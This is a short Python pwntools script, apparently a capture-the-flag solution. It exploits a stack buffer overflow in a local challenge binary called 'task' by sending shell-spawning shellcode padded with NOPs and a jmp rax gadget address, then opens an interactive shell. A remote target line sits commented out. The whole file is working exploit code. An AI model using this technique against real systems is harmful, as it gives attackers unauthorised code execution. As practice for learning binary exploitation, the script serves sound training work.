#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

p = elf.process()
#p = elf.debug(gdbscript="")
#p = remote("127.0.0.1", 9001)

JMP_RAX = 0x4010cc

p.sendline(asm(shellcraft.sh()).ljust(0x108, b"\x90") + p64(JMP_RAX))

p.interactive()
